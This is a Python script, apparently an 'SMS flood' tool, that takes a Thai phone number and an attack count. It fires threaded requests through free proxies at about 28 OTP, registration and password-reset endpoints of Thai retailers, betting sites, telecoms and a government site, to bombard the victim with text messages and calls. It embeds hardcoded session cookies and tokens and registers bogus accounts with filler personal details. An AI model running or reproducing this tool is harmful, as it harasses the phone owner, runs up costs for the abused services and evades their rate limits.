import requests as ru
import threading
import requests
import time
import random
import os
import datetime
import sys
import asyncio
import random
from re import search
from requests import Session
from re import search
from bs4 import BeautifulSoup as bs
from user_agent import generate_user_agent
os.system("clear")

proxy = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt").text
f = open("proxy.txt", "w")
t = f.write(proxy)
g = open("proxy.txt", "r")
s = g.read().splitlines()


async def home():
	print('''
           \x1b[91m┏━┓━┏┓┏━━━┓┏━┓━┏┓┏━━━┓┏━┓┏━┓┏━━━┓
           \x1b[00m┃┃┗┓┃┃┃┏━┓┃┃┃┗┓┃┃┃┏━┓┃┃┃┗┛┃┃┃┏━━┛
           \x1b[94m┃┏┓┗┛┃┃┃━┃┃┃┏┓┗┛┃┃┃━┃┃┃┏┓┏┓┃┃┗━━┓
           \x1b[94m┃┃┗┓┃┃┃┃━┃┃┃┃┗┓┃┃┃┗━┛┃┃┃┃┃┃┃┃┏━━┛
           \x1b[00m┃┃━┃┃┃┃┗━┛┃┃┃━┃┃┃┃┏━┓┃┃┃┃┃┃┃┃┗━━┓
           \x1b[91m┗┛━┗━┛┗━━━┛┗┛━┗━┛┗┛━┗┛┗┛┗┛┗┛┗━━━┛
           ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
           ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
	''')
	phone = input(" \x1b[95mPHONE-NUMBER  : \x1b[92m")
	
	if int(phone) <= 99999999 or int(phone) >= 999999999:
		print()
		print('\x1b[92m[ NONAME ]\x1b[00m : \x1b[91mEnter a Thailand phone number [ ! ] \x1b[00m')
		time.sleep(2)
		os.system('clear')
		os.system("python smsflood.py")
	else:
		jam = int(input("\x1b[95m AMOUNT-ATTACK : \x1b[92m"))
		print()
		print()
		
		ru.post("https://www.tgfone.com/signin/add_register",headers={"content-type": "application/x-www-form-urlencoded","user-agent": generate_user_agent(),"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","cookie": "PHPSESSID=6d00c9f6d3b9b31a559fbc13edb560d4e571fb71;_gcl_au=1.1.491392800.1657955935;_gid=GA1.2.1244336456.1657955937;_gat_gtag_UA_163796127_1=1;_fbp=fb.1.1657955937500.30844796;G_ENABLED_IDPS=google;_ga_1QLSWVZFZ2=GS1.1.1657955937.1.1.1657955943.0;_ga=GA1.2.160165897.1657955937"},data=f"mobile_form={phone}&password_form=as257400As&confirmpassword_form=as257400As&name_form=skkdmx&lastname_form=dkmsxm&stype=2")
		
		def api1():
			send = Session()
			send.headers.update({"user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'})
			sms = send.post("https://api.jobbkk.com/v1/easy/otp_code",data="mobile="+phone,proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{sms}")
		def api2():
			r = requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%2FLCKcoaEYy14g4HXhfjwGl5eOP1MZpX99v3PE75RD8GTZOTSvxcNvhvTTGYHI7;XSRF-TOKEN=33ed88f53546803c779ff8c10e7386057YuSCY%2FkUuCibrt0phirk%2BftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc%2BUMKSLdUFEtf7U4rRzuy2rvmK%2BLFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api3():
			r = requests.post("https://www.carsome.co.th/website/login/sendSMS",headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "amp_893e6b=w-newQWGaJ9H7YmD5KD1Jg...1g6l3e5ht.1g6l3e5ht.0.0.0;cky-active-check=yes;ajs_anonymous_id=bc6fbe42-9d69-40d9-93db-ba6b777861c1;_gcl_au=1.1.1543614339.1656418159;_ALGOLIA=anonymous-0a2bcc78-8c2b-4051-bfea-97cb347b1e17;__lt__cid=f282ddb1-0630-4c9e-ab88-27f6bd651a35;__lt__sid=530143c9-c9d21696;cookieyesID=R1V5aHU4eWswY21YbjM0NHFGb1FVc1pObDc3U2NSYkk=;moe_uuid=ff0db811-2642-4a84-83a3-7dd26d9c33a1;__cf_bm=4SQWD6XX3mlhMhXrkJ8A1.4MzqJ80OVt9BMJ9NH5uFw-1656418177-0-AdYubBhGil+XHg2/1J8WHy36qRL2urjlZUNUYGwGOkQyg0wlFLvwXAv8ugmj2IdM5ZaTfFxlz/2lRwsTuRRxnrQ=;cky-consent=no;cookieyes-necessary=yes;cookieyes-functional=no;cookieyes-analytics=no;cookieyes-performance=no;cookieyes-advertisement=no;cookieyes-other=no"},json={"username":phone,"optType":0},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api4():
			r = requests.get(f"https://nocnoc.com/authentication-service/user/OTP/verify-phone/%2B66{phone[1:]}?lang=th&userType=BUYER&locale=th&orgIdfier=scg&phone=%2B66{phone[1:]}&phoneCountryCode=%2B66&b-uid=1.0.760",headers={"authorization": "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..MSrqMX5S5Ui8NbGvEih2uw.NCJuqSPHzIwZ0Jy4Snq25pKUa887meHakzTe3YTCUnVsMwY8cQMnJ-nOr6Lbb5irc2gr8VfD0G2ZYocg22oVH36DdBnfoJirezzLuf9Uc2DiaQHLJ8OJY3UHo8fLUMB7BYe2w0Q5fDdMF1N0u8_aGA.ZNn49ubbJXSlycijnTncbQ"},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api5():
			r = requests.post("https://allmygod.com/env/authen.php?requestotp",headers={"conten-type": "multipart/form-data; boundary=----WebKitFormBoundaryHacPQem5vYh1MtVy","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "PHPSESSID=3kvmfqk7geaopupsvh3ka8ss90"},data={"phone_number": phone},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api6():
			r = requests.post("https://api.freshket.co/baseApi/Users/RequestOtp",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Content-Type": "application/json;charset=UTF-8"},json={"isDev":"false","language":"th","phone":f"+66{phone[1:]}"},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api7():
			r = requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api8():
			r = requests.get(f"https://hdmall.co.th/phone_verifications?express_sign_in=1&mobile={phone}",proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api9():
			r = requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp", data={"mobile_phone_no":phone},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api10():
			r = requests.get(f"https://api.joox.com/web-fcgi-bin/web_account_manager?optype=5&os_type=2&country_code=66&phone_number=0{phone}&time=1641777424446&_=1641777424449&callback=axiosJsonpCallback2",proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api11():
			r = requests.post("https://www.mtsblockchain.com/mgb-api/user/register/reqotp",json={"mobile": phone},headers={"Content-Type":"application/json","Cookie":"_ga=GA1.2.1476569446.1657959172; _gid=GA1.2.587325211.1657959172; _gat_gtag_UA_230676474_1=1; connect.sid=s%3Avu1rVQbmGkMrSzQS7GYQ-y4VHMxHdmH7.zuhlp%2BBtukL2ksityudE9OTqdUH5G3dk3XHm3zNEHIs; cookie_policy_accepted=1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api12():
			r = requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username": phone,"password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api13():
			r = requests.post("https://api.ulive.youpik.com/api-base/sms/sendCode",headers={"authorization": "Basic d2ViQXBwOndlYkFwcA==","content-type": "application/x-www-form-urlencoded;charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"},data=f"phone={phone[1:]}&type=1",proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api14():
			r = requests.post("https://pygw.csne.co.th/api/gateway/truewalletRequestOtp",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "pygw_csne_coth=91207b7404b2c71edd9db8c43c6d18c23949f5ea"},data=f"transactionId=b05a66a7e9d0930cbda4d78b351ea6f7&phone={phone}",proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api15():
			r = requests.post("https://vaccine.trueid.net/vacc-verify/api/getotp",headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8","accept": "application/json, text/plain, */*","cookie": "_gcl_au=1.1.628507904.1657519113;_cbclose=1;_cbclose26068=1;_uid26068=51BC4E60.1;_ctout26068=1;verify=test;_ga=GA1.2.682897436.1657519114;_gid=GA1.2.1721036016.1657519114;_gat_UA-86733131-1=1;_fbp=fb.1.1657519114976.1588263006;afUserId=64e5ba75-c9e2-4e45-aa62-7f5318ec6d9c-p;AF_SYNC=1657519116965;_ga_R05PJC3ZG8=GS1.1.1657519113.1.1.1657519130.43;OptanonAlertBoxClosed=2022-07-11T05:58:54.186Z;OptanonConsent=isIABGlobal=false&datestamp=Mon+Jul+11+2022+12%3A58%3A54+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.13.0&hosts=&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1%2CC0005%3A1"},json={"msisdn":phone,"function":"enroll"},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api16():
			session = Session()
			ReqTOKEN = session.get("https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated", headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"}).text
			r = session.post("https://srfng.ais.co.th/login/sendOneTimePW", data=f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "authorization": f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api17():
			r = requests.post("https://www.kaitorasap.co.th/api/index.php/send-otp-login/",headers={"Accept": "application/json, text/javascript, */*; q=0.01","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Cookie": "PHPSESSID=080ugg4928ulkhj6kaggiqkvd1; _ga=GA1.3.1856390916.1657557339; _gid=GA1.3.1103002458.1657557339; _gat_gtag_UA_141105037_1=1; G_ENABLED_IDPS=google"},data=f"phone_number={phone}&lag=",proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api18():
			r = requests.get(f'https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code&phone={phone}',headers={"accept": "application/json, text/javascript, */*; q=0.01","x-requested-with": "XMLHttpRequest","user-agent": generate_user_agent(),"cookie": "referer=https%3A%2F%2Fwww.konvy.com%2Fm%2F;PHPSESSID=vnqlo8v638jofnb15arplijj3i;k_privacy_state=true;referer=https%3A%2F%2Fwww.konvy.com%2Fm%2Flogin.php;_gcl_au=1.1.531291202.1661272286;_fbp=fb.1.1661272286002.265391910;_gid=GA1.2.960487052.1661272286;_gat_UA-28072727-2=1;_tt_enable_cookie=1;_ttp=d640ab77-0c19-4578-855d-4fb1ceda3f0a;f34c_new_user_view_count=%7B%22count%22%3A2%2C%22expire_time%22%3A1661358684%7D;_ga_Z9S47GV47R=GS1.1.1661272286.1.1.1661272293.53.0.0;_ga=GA1.2.1347355119.1661272286"},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api19():
			r = requests.post("https://api2.1112.com/api/v1/otp/create",headers={"content-type": "application/json;charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"},json={"phonenumber":phone,"language":"th"},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api20():
			r = requests.post("https://www.msport1688.com/auth/otp_sender",headers={"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "msp_ss_client=4a4nipncnp9l5ced7k5v7rrs9hdnscda;_ga=GA1.1.72563414.1657611524;_ga_1YLLB0C2FF=GS1.1.1657611524.1.1.1657611527.0"},data=f"phone={phone}&otp=&password=&bank=&bank_number=&full_name=&ref=",proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api21():
			r = requests.post("https://ep789bet.net/auth/send_otp",headers={"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","user-agent": "ep789bet=g9b6cbooof7sq9tmmdtside6s1topdus;__cf_bm=N34Ldd3PZGzyar210NA3MW6tlk6DVyL7TRWX9siAsXk-1657612222-0-AchySBWuKW05LLldbYqjOGsQ9fG8ijO20enZMUqVHANUif9L3qqazpIcC5nC+tUMIfCoSH575g2k16EyMHk43KcE5tZmJTd+lHogz8Rpd3lKbU3eUD1RsrUmgeJwbddVBQ=="},data=f"phone={phone}&otp=&password=&bank=&bank_number=&full_name=&ref=",proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api22(): # CALL
			r = requests.post("https://www.theconcert.com/rest/request-otp",headers={"content-type": "application/json;charset=UTF-8","accept": "application/json, text/plain, */*","user-agent": generate_user_agent(),"x-requested-with": "XMLHttpRequest","x-csrf-token": "d6VfYNo3-RJK5IK0axoCE7KLIAPbW9K0IbL8","x-xsrf-token": "b2b9a4f732d05668c61e64f836417f67/iS0TaMFdXciRQYns4jNXpeVYy3DlvGY6ML+q8oquXvseUvcnIelmUwwR9/wJHKHjGKfN0+WS9orN1zdtt4J3I72qJ3x4Va07eBC0isPMu4ktiZw5DvLcobqJ9l39rFP"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"call","digit":4},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api23():
			r = requests.post("https://www.jdbaa.com/api/otp-not-captcha",headers={"content-type": "application/json; charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "_ga=GA1.2.139524076.1653888756;_hjSessionUser_1879787=eyJpZCI6IjczNjVhMTYxLTFkNzktNWVjYS04N2M4LTc3ZTk3ODUyY2U3ZiIsImNyZWF0ZWQiOjE2NTM4ODg3NTc4ODksImV4aXN0aW5nIjp0cnVlfQ==;_fw_crm_v=b55243cc-06b2-4f25-ca32-2a7634301a95;connect.sid=s%3AiV4V1-65FA5rpJyEObOITUh2fyDcYhen.aclXEUqD4Qe5nlUYVG0mb1zIAC4OuxP4FWCX6%2B8E9WU;io=c7ilAXG_QnIDDz0xAKH5;countdown_lotto_th=345759;_gid=GA1.2.626569110.1657612643;_gat_gtag_UA_139533742_1=1;_hjIncludedInSessionSample=0;_hjSession_1879787=eyJpZCI6ImVjMzQ5NWNiLTIwOGQtNGViYS1hNmY3LTY2ZDVhM2JhMGNmZCIsImNyZWF0ZWQiOjE2NTc2MTI2NDUyMzEsImluU2FtcGxlIjpmYWxzZX0=;_hjAbsoluteSessionInProgress=0;modal_htd=true;_fw_crm_v=b55243cc-06b2-4f25-ca32-2a7634301a95"},json={"phone_number":phone,"user_id":f"ak{phone}"},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api24():
			SEND  = Session()
			API_WEB = SEND.get('https://th.zmyhome.com/',headers={"user-agent": generate_user_agent()}).text
			SEND_TOKEN = bs(API_WEB,'html.parser')
			TOKEN = SEND_TOKEN.find("input",attrs={"name":"_csrf"})
			SMS = SEND.post('https://th.zmyhome.com/api/ajax/sms-otp',headers={"x-csrf-token": TOKEN['value'],"content-type": "application/x-www-form-urlencoded; charset=UTF-8"},data='tel='+phone+'&userId=',proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{SMS}")
		def api25():
			SMS = requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER",proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{SMS}")
		def api26():
			SMS = requests.post("https://www.tgfone.com/signin/verifylforgot",headers={"user-agent": generate_user_agent(),"content-type": "application/x-www-form-urlencoded","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","cookie": "_gcl_au=1.1.491392800.1657955935;_gid=GA1.2.1244336456.1657955937;_fbp=fb.1.1657955937500.30844796;G_ENABLED_IDPS=google;PHPSESSID=d42c517cc5234d40c44310c39e2212d464e2b18a;_ga_1QLSWVZFZ2=GS1.1.1657955937.1.1.1657956238.0;_ga=GA1.2.160165897.1657955937;_gat_gtag_UA_163796127_1=1"},data=f"forgot_name={phone}",proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{SMS}")
		def api27():
			SEND  = ru.Session()
			API_WEB = SEND.get('https://app.khonde.com/register',headers={"User-Agent": generate_user_agent()}).text
			SEND_TOKEN = bs(API_WEB,'html.parser')
			TOKEN = SEND_TOKEN.find("meta",attrs={"name":"csrf-token"})
			SMS = SEND.get(f'https://app.khonde.com/requestOTP/{phone}',headers={"X-XSRF-TOKEN": TOKEN['content'],"User-Agent": generate_user_agent(),"Cookie": "_gid=GA1.2.1429375693.1657960248; _gac_UA-74972330-26=1.1657960248.CjwKCAjww8mWBhABEiwAl6-2RVYe9XsjIIksM_BccLyzFFDX8T_YVTKKPOe2Q0BPyoTwjuzYwh6EyBoCN7wQAvD_BwE; _gat_gtag_UA_74972330_26=1; _fbp=fb.1.1657960248320.1708448457; _tt_enable_cookie=1; _ttp=da5ea560-0a16-4bc0-90d1-3ddd1fc73db4; XSRF-TOKEN=eyJpdiI6IisyMWw5ZnhaS2JXV3FmR3dyV0JGdVE9PSIsInZhbHVlIjoiQnNLQjh6dExTdmh5ZnJZeHNjNkkzd3dMMHpXV1dZV2hROXYyV0NMSnZpOWdQeFdqRU9RQ3Y4M2Y1aXk5Y1QvcFM1V2N0MG9oRUkxQUU3TlFESDlVU21Qa2JMMmxqRHBISFRsOXZGaFVMVGY0ZW1idysrWUVlNTFQWDYvQ1NSWFgiLCJtYWMiOiI1ODRiNTRmOGJkMzRjMzE1YmUxMmQ2Y2NkZWRhOGQ5ZDkwM2MxYWNjMmVmOTk2MzE4MmYzYmQ3ZWFiYWQ1ZjBlIn0%3D; khonde_session=eyJpdiI6IlMyNmpkRWl4NTh1emFLRWNiL0k2ZlE9PSIsInZhbHVlIjoiSEUzNGNnMVFwNGxJNTZVNmVzMWtrQk82NDZ0eGM1ckxrK3VVS1BWZ1NOMDlmbWl5RXdpa2dDMzQrdzIvMkRZeFpwa2dGamdGcFYwcVZWVjhFSjg2elZ1OUFxTWhuV3hIZlV2cFVIVW9VMnBCUEIxVUV6MVp1Y3JPb3JBOXFZeCsiLCJtYWMiOiJiYzM2ZDVhOWFiOTY3NTAyN2RhYTI1NWYwYjZhY2RmYTgxNWRmOGJkOWJhYjcyMGVhYzU0MjE4NGYxYjdlMTU4In0%3D; _ga_X6J1S6LV1V=GS1.1.1657960251.1.0.1657960251.60; _ga=GA1.1.1429094721.1657960248"},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{SMS}")
		def api28():
			SMS = requests.post("https://gamingnation.dtac.co.th/api/otp/request",headers={"User-Agent": generate_user_agent(),"Cookie": "auth.strategy=local; i18n_redirected=th; _gcl_au=1.1.265124296.1661273714; _ga=GA1.3.1857579863.1661273717; _gid=GA1.3.1514915490.1661273717; _fbp=fb.2.1661273718125.787639535; _tt_enable_cookie=1; _ttp=7e4a2162-1ab4-41a0-8b77-e1188cda6a3a; _hjSessionUser_2510409=eyJpZCI6ImVkM2I0OWU2LTBjODQtNWU1ZC04OWIzLTZlMjk5NGFhMWE3NCIsImNyZWF0ZWQiOjE2NjEyNzM3MTc5MzcsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample=0; _hjSession_2510409=eyJpZCI6IjA4YjEyYTNlLTExNjgtNDNlMS05NTVmLWMyMWY2OTU5MGFiYyIsImNyZWF0ZWQiOjE2NjEyNzM3MTgzMTksImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; _gat_UA-16732483-1=1"},json={"template":"register","phone_no":phone},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{SMS}")
		
			
		
		for i in range(jam):
			threading.Thread(target=api1).start()
			threading.Thread(target=api2).start()
			threading.Thread(target=api3).start()
			threading.Thread(target=api4).start()
			threading.Thread(target=api5).start()
			threading.Thread(target=api6).start()
			threading.Thread(target=api7).start()
			threading.Thread(target=api8).start()
			threading.Thread(target=api9).start()
			threading.Thread(target=api10).start()
			threading.Thread(target=api11).start()
			threading.Thread(target=api12).start()
			threading.Thread(target=api13).start()
			threading.Thread(target=api14).start()
			threading.Thread(target=api15).start()
			threading.Thread(target=api16).start()
			threading.Thread(target=api17).start()
			threading.Thread(target=api18).start()
			threading.Thread(target=api19).start()
			threading.Thread(target=api20).start()
			threading.Thread(target=api21).start()
			threading.Thread(target=api22).start()
			threading.Thread(target=api23).start()
			threading.Thread(target=api24).start()
			threading.Thread(target=api25).start()
			threading.Thread(target=api26).start()
			threading.Thread(target=api27).start()
			threading.Thread(target=api28).start()
			

		
	
	
	
	
	
	
	
	
	
if __name__ == '__main__':
	asyncio.run(home())
